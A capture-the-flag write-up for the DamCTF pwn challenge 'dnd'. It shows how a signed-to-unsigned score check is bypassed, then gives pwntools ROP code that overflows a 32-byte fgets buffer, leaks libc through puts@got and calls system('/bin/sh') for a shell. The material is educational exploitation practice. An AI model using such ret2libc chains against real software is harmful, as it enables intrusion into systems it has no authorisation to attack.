# dnd

## 🧩 Challenge Summary

- **Category**: Pwn
- **Points**: 404
- **Solves**: 150 teams

---

### 📝 Problem Description

> Dungeons and Dragons is fun, but this is DamCTF! Come play our version

---

## 🧠 Challenge Structure

Protections:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Canary:   No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

- The player can go through up to 5 combat encounters.
- Each turn allows choosing between `[a]ttack` or `[r]un`.
- If the player's **score drops below 0**, the following condition is bypassed due to type casting.
- Once bypassed, the `win()` function is executed, which contains a buffer overflow.

This setup enables a controlled path to ROP exploitation by manipulating the score and overflowing the stack.

---

## ✅ Exploitation Flow

### 🔹 Step 1: Abuse Signed-to-Unsigned Cast to Trigger `win()`

The player can intentionally lose to strong monsters to decrease the score below 0.
In the `DidWin()` function, the condition:

```cpp
bool __fastcall Game::DidWin(Game *this)
{
  return *(_BYTE *)this > 0x63u;  // e.g., -1 becomes 0xFF and bypasses the check
}
```

...will be satisfied because a negative score like `-1` is cast to an unsigned byte (`0xFF`). This causes the program to execute `win()`.

```python
def fight_loop(r):
    flag = False

    for _ in range(5):
        r.recvuntil(b"New")
        r.recvuntil(b"(")
        mob_hp = int(r.recv(1).decode())

        if not flag and mob_hp > 5:
            flag = True
            r.sendlineafter(b"[r]un? ", b"a")  # intentionally take the hit
        else:
            r.sendlineafter(b"[r]un? ", b"r")  # skip weak mobs
```

---

### 🔹 Step 2: Exploit win() via ROP

In the `win()` function, input is read via an unsafe `fgets()` call:

```cpp
__int64 win(void)
{
  char s[32]; // [rsp+0h] [rbp-60h] BYREF

  fgets(s, 256, _bss_start);
}
```

A padding of `0x68` bytes is needed to reach the return address.

#### 🔸 Leak libc Address

ROP chain leaks the `puts@got` address and returns to `win()` for a second stage:

```python
def leak_libc_base(r):
    rop = ROP(elf)
    rop.raw(b"A" * 0x68)              # padding
    rop.raw(pop_rdi_rbp)              # pop rdi; pop rbp; ret
    rop.raw(elf.got.puts)             # puts@got
    rop.raw(b"B" * 8)                 # dummy for rbp
    rop.raw(elf.sym.puts)             # call puts
    rop.raw(elf.sym._Z3winv)          # return to win() for second input

    r.sendlineafter(b"warrior? ", rop.chain())
    r.recvline()

    leaked_puts = u64(r.recvline().strip().ljust(8, b"\x00"))
    libc.address = leaked_puts - libc.sym.puts
```

> 🔎 Note: `elf.sym._Z3winv` is the mangled name for the C++ `win()` function.

#### 🔸 Get Shell

With the libc base known, spawn a shell using `/bin/sh` and `system()`:

```python
def get_shell(r):
    rop = ROP(elf)
    rop.raw(b"A" * 0x68)
    rop.raw(pop_rdi_rbp)
    rop.raw(next(libc.search(b"/bin/sh")))
    rop.raw(b"B" * 8)
    rop.raw(rop.ret)                 # stack alignment
    rop.raw(libc.sym.system)

    r.sendlineafter(b"warrior? ", rop.chain())
    r.interactive()
```

---

## 🏁 Flag

After successful exploitation:

```
$ cat flag
dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}
```
